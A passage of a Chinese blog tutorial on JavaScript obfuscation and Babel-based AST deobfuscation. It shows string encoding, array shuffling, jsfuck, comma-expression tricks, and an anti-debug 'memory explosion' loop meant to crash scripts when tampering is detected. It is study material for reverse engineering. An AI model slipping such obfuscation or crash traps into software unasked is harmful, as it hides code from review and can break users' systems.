title="十六进制字符串"></a>十六进制字符串</h3><p>字符串的十六进制形式代替字符串</p><p>字符变为字节形式，如’yy’-&gt;’\x79\x79’再转化为Hex形式</p><p>脚本实现上面的混淆</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexEnc</span>(<span class="params">code</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> hexStr=[],i=<span class="number">0</span>,s;i&lt;code.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        s=code.<span class="title function_">charCodeAt</span>(i).<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">        hexStr+=<span class="string">&quot;\\x&quot;</span>+s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexStr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//charAt是取出字符串中对应索引的字符，而charCodeAt用来取出对应索引字符的ASCII码，然后toString(16)转化为十六进制</span></span><br></pre></td></tr></table></figure><p><code>var a =&#123;&quot;name&quot; : &quot;zxk1ng&quot;&#125;;</code></p><p>这里的”name“不能拼接不能加密，但是可以变为字节形式</p><h3 id="unicode"><a href="#unicode" class="headerlink" title="unicode"></a>unicode</h3><p><strong>可以对变量和字符串进行unicode</strong></p><p>例子</p><p><code>var Week=[&#39;一&#39;,&#39;二&#39;]  &lt;==&gt;var Week=[&#39;\u4e00&#39;,&#39;\u4e8c&#39;]</code></p><p><code>&#39;Date&#39; &lt;==&gt;</code> ‘\u0044\u0061\u0074\u0065’</p><p>以下代码实现unicode转换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">unicodeEnc</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> value=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        value+=<span class="string">&quot;\\u&quot;</span>+(<span class="string">&quot;0000&quot;</span>+<span class="built_in">parseInt</span>(str.<span class="title function_">charCodeAt</span>(i)).<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">substr</span>(-<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unicode字符串的还原方法，与十六进制字符串一样，把字符串放到控制台中输出即可</p><h3 id="字符串的ASCII码混淆"><a href="#字符串的ASCII码混淆" class="headerlink" title="字符串的ASCII码混淆"></a>字符串的ASCII码混淆</h3><p>为了完成这个混淆需要String对象下的charCodeAt和fromCharCode(和charCodeAt过程相反)</p><p><code>console.log(&#39;b&#39;.charCodeAt(0));</code></p><p><code>console.log(String.fromCharCode(120,12));</code>可以有多个参数，<strong>返回字符串</strong></p><p>把一个字符串转化为字节数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">stringToByte</span>(<span class="params">str</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> byteArr=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;str.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        byteArr.<span class="title function_">push</span>(str.<span class="title function_">charCodeAt</span>(i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> byteArr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fromCharCode接收的参数类型不是数组，如果想要传递数组，可以使用String.fromCharCode.apply(null,[102,111,114])，apply是函数对象就有的方法。</p><p>eval与function可以把字符串当做代码使用，function用来生成一个函数。</p><p>atob() 方法用于解码 base-64 编码的字符串。</p><p>btoa()用于编码base64</p><ul><li>如果用base64编码后的方法要正常使用，需要atob(“xxx”)才能正常发挥这个方法功能。</li></ul><p><img src="2025-01-15-AST混淆与反混淆/image-20241113230217551.png" alt="image-20241113230217551"></p><h3 id="数值常量加密"><a href="#数值常量加密" class="headerlink" title="数值常量加密"></a>数值常量加密</h3><p>例如md5加密中的常量值，把他变化就不易确定这是哪个加密算法或不容易找到关键代码。</p><h2 id="增加逆向的工作量"><a href="#增加逆向的工作量" class="headerlink" title="增加逆向的工作量"></a>增加逆向的工作量</h2><h3 id="数组混淆"><a href="#数组混淆" class="headerlink" title="数组混淆"></a>数组混淆</h3><p>所有字符串提取到一个数组中，在引用字符串的地方全都以数组下标的方式去访问数组成员(数组里的一般会进行加密变化)，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> bigArr = [<span class="string">&#x27;Date&#x27;</span>,<span class="string">&#x27;getTime&#x27;</span>,<span class="string">&#x27;log&#x27;</span>];</span><br><span class="line"><span class="variable language_">console</span>[bigArr[<span class="number">2</span>]](<span class="keyword">new</span> <span class="variable language_">window</span>[bigArr[<span class="number">0</span>]]()[bigArr[<span class="number">1</span>]]());</span><br><span class="line"><span class="comment">//console.log(new window.Date().getTime());</span></span><br></pre></td></tr></table></figure><p><strong>在别的语言，同一个数组只能存放同一类型，但是JS可以存放多个类型</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">People</span>(<span class="params"></span>)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">People</span>.<span class="property">a</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">People</span>();</span><br><span class="line">p.<span class="property">constructor</span>.<span class="title function_">a</span>(); ==&gt;会输出hello</span><br><span class="line">p.<span class="property">constructor</span>       ==&gt;输出构造函数 <span class="keyword">function</span> <span class="title function_">People</span>(<span class="params"></span>)&#123;&#125;</span><br></pre></td></tr></table></figure><p><code>console.log(&quot;&quot;[&#39;constructor&#39;][&#39;fromCharCode&#39;](120));   输出x</code>相当于调用String下的fromCharCode方法。最前面可以是任意的字符串对象，也可以是空字符串，constructor代表获取构造函数，因此<code>&quot;&quot;[&#39;constructor&#39;]</code>等同于String</p><h3 id="数组乱序"><a href="#数组乱序" class="headerlink" title="数组乱序"></a>数组乱序</h3><p>把数组成员打乱顺序，然后在索引成员之前再把数组恢复原来的顺序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组打乱</span></span><br><span class="line"><span class="keyword">var</span> bigArr=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line">(<span class="keyword">function</span>(<span class="params">arr,num</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> shuffer=<span class="keyword">function</span>(<span class="params">nums</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(--nums)&#123;</span><br><span class="line">            arr.<span class="title function_">unshift</span>(arr.<span class="title function_">pop</span>()); <span class="comment">//最后成员放在开头</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">shuffer</span>(++num);</span><br><span class="line">&#125;(bigArr,<span class="number">0x20</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bigArr);</span><br></pre></td></tr></table></figure><p>数组恢复</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//数组打乱</span></span><br><span class="line"><span class="keyword">var</span> bigArr=[填入打乱后的数组顺序];</span><br><span class="line">(<span class="keyword">function</span>(<span class="params">arr,num</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> shuffer=<span class="keyword">function</span>(<span class="params">nums</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(--nums)&#123;</span><br><span class="line">            arr[<span class="string">&#x27;push&#x27;</span>](arr[<span class="string">&#x27;shift&#x27;</span>]());<span class="comment">//第一个成员放在最后</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">shuffer</span>(++num);</span><br><span class="line">&#125;(bigArr,<span class="number">0x20</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bigArr);</span><br></pre></td></tr></table></figure><h3 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h3><p>添加一些没有意义却可以混淆视听的代码，是花指令的核心</p><h3 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h3><p>jsfuck也是一种编码，把js代码转化为只用6个字符就可以表示的代码。比如常量8转化为jsfuck为：</p><p><code>(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])</code></p><p>基本原理：</p><p>+号是js一个运算符，当他作为一元运算符使用，代表强转为数值型。[]是空数组所以+[]等于0，!+[]等同于!0，js是一种弱类型语言，js引擎会在适当时候，自动完成类型隐式转化。!是js的取反，也就是这时候需要一个布尔值。（js中7种值为假值：false,undefuned,null,0,-0,NaN,””，其他都是真），因此!0是true，!![]两次取反还是真。</p><p>+号作为二元运算符的时候，加入一边有字符串表示拼接。如果两边都没有表示数值相加。</p><p>实际开发中，jsfuck应用有限，只会应用于js中的一部分代码，主要由于还原简单，直接在控制台输入即可输出结果。</p><h2 id="代码执行流程防护原理"><a href="#代码执行流程防护原理" class="headerlink" title="代码执行流程防护原理"></a>代码执行流程防护原理</h2><h3 id="流程平坦化"><a href="#流程平坦化" class="headerlink" title="流程平坦化"></a>流程平坦化</h3><p>通过switch…case语句改变原来的流程</p><h3 id="逗号表达式混淆"><a href="#逗号表达式混淆" class="headerlink" title="逗号表达式混淆"></a>逗号表达式混淆</h3><p>把多个表达式或语句连接成一个复合语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">var</span> b=a+<span class="number">2000</span>;   </span><br><span class="line">    <span class="keyword">var</span> c=b+<span class="number">3000</span>;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逗号表达式</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a,b,c;</span><br><span class="line">    <span class="keyword">return</span> a=<span class="number">1000</span>,</span><br><span class="line">    b=a+<span class="number">2000</span>,</span><br><span class="line">    c=b+<span class="number">3000</span>,</span><br><span class="line">    c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//return语句后通常只能跟一个表达式，他会返回这个表达式的结果，但是逗号运算符可以把多个表达式连接成一个复合语句。所以上述代码会返回最后一个表达式计算后的结果，但是前面的表达式依然会执行，</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=(a=<span class="number">1000</span>,a+=<span class="number">2000</span>) ==&gt;<span class="number">3000</span><span class="string">``</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一行括号代表是一个整体，也就是把整体赋值给a，会先执行a=1000,再</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">a,b,c</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> c=(b=(a=<span class="number">1000</span>,a+<span class="number">2000</span>),b+<span class="number">3000</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>逗号表达式混淆不仅能处理赋值表达式，还能处理调用表达式，成员表达式，如下案例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">    <span class="attr">add</span>:<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sub</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">1000</span>;</span><br><span class="line">    <span class="keyword">var</span> b=<span class="title function_">sub</span>(a,<span class="number">3000</span>)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">var</span> c=b+obj.<span class="title function_">add</span>(b,<span class="number">2000</span>);</span><br><span class="line">    <span class="keyword">return</span> c+obj.<span class="property">name</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test函数中有函数调用表达式，还有成员表达式，可以使用下面两个方法进行处理：</p><ul><li>提升变量声明到参数中</li><li><code>b=(a=1000,sub)(a,3000)+1</code>中的<code>(a=1000,sub)</code>可以整体返回sub函数，然后直接调用，最后加1赋值给b<br>同理，如果sub改为obj.add的话，可以处理成<code>(a=1000,obj.add)(a,3000)</code>，或者<code>(a=1000,obj).add(a,3000)</code></li></ul><p>第二种方法是调用表达式在等号右边的情况，例如test中第三句，里面的b+obj.add(b,2000)，可以对obj.add进行包装，处理成<code>b+(0,obj.add)(b,2000)</code>或者<code>b+(0,obj).add(b,2000)</code>,括号中0可以换成花指令</p><h2 id="其他代码防护方案"><a href="#其他代码防护方案" class="headerlink" title="其他代码防护方案"></a>其他代码防护方案</h2><h3 id="eval加密"><a href="#eval加密" class="headerlink" title="eval加密"></a>eval加密</h3><p>eval加密网址：<a href="http://www.jqueryfuns.com/tools/jsencode">http://www.jqueryfuns.com/tools/jsencode</a></p><p>eval全局函数，把一段字符串当做代码执行。</p><h3 id="内存爆破"><a href="#内存爆破" class="headerlink" title="内存爆破"></a>内存爆破</h3><p>是在代码中加入死代码，正常情况下，这段代码不执行，当检测函数被格式化或者函数被Hook就跳转到这段代码执行，这道内存溢出程序崩溃</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d=[<span class="number">0x1</span>,<span class="number">0x0</span>,<span class="number">0x0</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0x0</span>,c=d.<span class="property">length</span>;i&lt;c;i++)&#123;</span><br><span class="line">        d.<span class="title function_">push</span>(<span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()));</span><br><span class="line">        c=d.<span class="property">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="检测代码是否格式化"><a href="#检测代码是否格式化" class="headerlink" title="检测代码是否格式化"></a>检测代码是否格式化</h3><p>在js中，函数是可以转为字符串的。因此可以选择一个函数转化为字符串然后跟内置字符串对比或用正则匹配。没有匹配上就说明被格式化了</p><p>函数转字符串如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(add+<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(add.<span class="title function_">toString</span>());</span><br><span class="line"><span class="comment">//&quot;function add(a,b)&#123;return a+b;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>在Chrome中，把代码格式化后会产生一个后缀为<code>formatted</code>的文件，之后这个文件中设置断点，触发断点，会停在这个文件，但是这时把某个函数转化为字符串，取到的依然是格式化之前的代码，这种检测方法检测不到这种情况，那么这种检测方法应用场景如何？</p><p>在分析完算法想要获得结果，会选择直接修改源文件，然后运行结果，把格式化后代码保存成一个本地文件，这时某个函数转化为字符串取到的就是格式化后的结果</p><p>如果检测格式化，可以跳到内存爆破中</p><h1 id="AST的API详解"><a href="#AST的API详解" class="headerlink" title="AST的API详解"></a>AST的API详解</h1><h2 id="AST入门"><a href="#AST入门" class="headerlink" title="AST入门"></a>AST入门</h2><h3 id="AST基本结构"><a href="#AST基本结构" class="headerlink" title="AST基本结构"></a>AST基本结构</h3><p>经过Babel解析，里面的元素叫做节点(Node)，同时Babel提供许多方法去操作节点</p><p><strong>源代码</strong>`</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">    <span class="attr">add</span>:<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+<span class="number">1000</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">mul</span>:<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> a*b+<span class="number">1000</span>;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以在AST Explorer网站中对其进行Babel解析为AST，解析后AST有很多层级，这些层级互为父子节点对于解析后的结构查看相应的书籍内容即可，这里只是记录一些基础名称</p><ul><li>VariableDeclaration：表示是变量声明语句</li><li>kind：表示变量声明语句使用的关键字</li><li>declarations：声明的具体变量，是一个数组。</li><li>每一个变量都以VariableDeclarator表示</li><li>VariableDeclarator的属性主要是id和init，对于init，如果只是声明没有初始值，init为null，否则init节点下还有内容</li><li>对于上述原始代码而言，把对象字面量赋值给obj，成为ObjectExpression(对象表达式)，有对象自然有属性，所以properties是数组，一个属性对应一个成员，查看properties下内容</li><li>ObjectProperty：表示对象属性，</li><li>因为对象是键值对组成，在表示对象属性时，会有key和value两个节点，key是Identifier(标识符)，名字是name，对象的key也可以用字符串表示，这是key节点类型变为StringLiteral(字符串字面量)，value类型为StringLiteral</li><li>extra节点可以删除</li><li>对于函数表达式赋值给对象属性：type为FunctionExpression，函数名对象id节点，由于代码把一个匿名函数赋值给obj的add属性，所以这里id为null，函数参数对应params节点，是个数组，<strong>如果没参数params节点为空数组，</strong>函数体对应body节点</li><li>一般函数体都会用BlockStatement节点包裹，，BlockStatement里的body节点是多条语句，所以body是数组，如果函数有”use strict”标记，那么directives里会有相应节点</li><li>ReturnStatement(返回语句)</li><li>argument：函数返回内容，没有返回则为null</li><li>BinaryExpression：二元式</li><li>NumericLiteral：数值字面量</li></ul><h3 id="代码基本结构"><a href="#代码基本结构" class="headerlink" title="代码基本结构"></a>代码基本结构</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);   <span class="comment">//读写文件</span></span><br><span class="line"><span class="keyword">const</span> parser = <span class="built_in">require</span>(<span class="string">&quot;@babel/parser&quot;</span>);  <span class="comment">//@babel/parser：用来将js代码转化为AST</span></span><br><span class="line"><span class="keyword">const</span> traverse = <span class="built_in">require</span>(<span class="string">&quot;@babel/traverse&quot;</span>).<span class="property">default</span>;<span class="comment">//@babel/traverse:遍历ast中的节点</span></span><br><span class="line"><span class="keyword">const</span> t = <span class="built_in">require</span>(<span class="string">&quot;@babel/types&quot;</span>);            <span class="comment">//@babel/types：判断节点类型，生成新的节点等</span></span><br><span class="line"><span class="keyword">const</span> generator = <span class="built_in">require</span>(<span class="string">&quot;@babel/generator&quot;</span>).<span class="property">default</span>;  <span class="comment">//ast转化为js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> jscode = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;./demo.js&quot;</span>, &#123;</span><br><span class="line"><span class="attr">encoding</span>: <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">  &#125;);</span><br><span class="line"><span class="keyword">let</span> ast = parser.<span class="title function_">parse</span>(jscode);</span><br><span class="line"></span><br><span class="line"><span class="comment">//在这里对AST进行一系列的操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> code = <span class="title function_">generator</span>(ast).<span class="property">code</span>;</span><br><span class="line">fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;./demoNew.js&#x27;</span>, code, <span class="function">(<span class="params">err</span>)=&gt;</span>&#123;&#125;);</span><br></pre></td></tr></table></figure><p><strong>AST处理JS基本步骤</strong></p><ul><li>读取js文件解析为AST</li><li>对节点增删改查</li><li>生成js代码</li></ul><p><strong>后续内容没有特殊说明都以这个结构为准，代码只展现中间对ast有操作的部分</strong></p><h2 id="Babel中的组件"><a href="#Babel中的组件" class="headerlink" title="Babel中的组件"></a>Babel中的组件</h2><p>Babel的编译过程主要以下三个阶段</p><ul><li>解析：将输入字符流解析AST抽象语法树</li><li>转化：对抽象语法树进一步转化</li><li>生成：根据转化后的语法树生成目标代码</li></ul><h3 id="Babel的解析"><a href="#Babel的解析" class="headerlink" title="Babel的解析"></a>Babel的解析</h3><p>包括两个内容：词法分析与语法分析，经过这一步以后，可以直接得到输入源代码的AST抽象语法树</p><h3 id="Babel的转化"><a href="#Babel的转化" class="headerlink" title="Babel的转化"></a>Babel的转化</h3><p>转化步骤接收ast并对其进行遍历，再次过程中对节点进行添加，更新及移除等操作。后续对混淆js代码以及混淆js代码的还原都在此处，<strong>这是本书的重点</strong>，之所以将字符流转化为抽象语法树，原因是树状结构更加容易进行原子操作，可以对任意节点进行精细化的处理。在抽象语法树中，代码见得关系被抽象为节点的关系，而实现相同功能的节点之间的表示也是相同的，利用这一点，可以再语法树层面对输入的代码进行增删改查，而不必关心代码的书写。制定几条规则，Babel就可以对抽象语法树进行遍历，完成整个代码批量操作</p><h3 id="Babel的生成"><a href="#Babel的生成" class="headerlink" title="Babel的生成"></a>Babel的生成</h3><p>代码生成步骤把最终的ast语法树转换成字符串式的代码，代码生成很简单：深度优先遍历整个AST，然后构建可以表示转化后代码的字符串，经过这一步，就可以得到从ast抽象语法层层面修改过的代码。</p><h3 id="parser与generator"><a href="#parser与generator" class="headerlink" title="parser与generator"></a>parser与generator</h3><p>parser：将JS代码转化为AST  ==&gt; <code>let ast=parser.parse(jscode)</code>输出前使用JSON.stringify把对象转为json数据，如<code>JSON.stringify(ast,null,2)</code></p><p>generator：将AST转化为JS ==》 <code>let code=generator(ast).code</code>返回 一个对象，其中code属性才是需要的代码。</p><p>parser的parse是有两个参数，但是第二个参数在es6中才需要写出来，例如当看到js代码中有import，export时，就需要写出第二个参数且sourceType要指定为module。(sourceType默认为script)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ast = parser.<span class="title function_">parse</span>(jscode,&#123;</span><br><span class="line">    <span class="attr">sourceType</span>:<span class="string">&quot;module&quot;</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>generator返回的一个对象，同时他的第二个参数接纳一个对象，可以设置一些来影响输出结果。如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> code = <span class="title function_">generator</span>(ast, &#123;</span><br><span class="line"><span class="attr">retainLines</span>: <span class="literal">false</span>, </span><br><span class="line"><span class="attr">comments</span>: <span class="literal">false</span>, </span><br><span class="line"><span class="attr">compact</span>: <span class="literal">true</span></span><br><span class="line">&#125;).<span class="property">code</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(code);</span><br></pre></td></tr></table></figure><p>retainLines表示是否使用与源代码相同的行号，默认false，输出的是格式化之后的代码。</p><p>comments表示是否保留注释，默认true。</p><p>compact表示是否压缩代码，其中minified压缩程度最多，concise最少</p><h3 id="traverse与visitor"><a href="#traverse与visitor" class="headerlink" title="traverse与visitor"></a>traverse与visitor</h3><p>traverse用来遍历AST，但是单纯遍历没有意义，所以配合visitor使用。</p><p><code>visitor</code>是一个对象，她可以用来定义一些方法，用来过滤节点。</p><p><strong>案例理解traverse与visitor</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> visitor=&#123;&#125;;</span><br><span class="line">visitor.<span class="property">FunctionExpression</span>=<span class="title function_">funtion</span>(<span class="params">path</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;xxx&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">traverse</span>(ast,visitor);</span><br></pre></td></tr></table></figure><p><strong>分析</strong>：声明对象，名字随便。再给对象增加一个名为FunctionExpression的方法，它的名字是需要遍历的节点的类型(注意大小写)。traverse会遍历ast所有节点，当节点是FunctionExpression类型，调用visitor中的方法。visitor中的方法接收一个参数，traverse在遍历时，会把当前节点的Path对象传给他。最后把visitor作为第二个参数传到traverse里，第一个参数是ast。</p><p><strong>定义visitor的三种方式</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visitor1=&#123;</span><br><span class="line">    <span class="title class_">FunctionExpression</span>:<span class="keyword">function</span>(<span 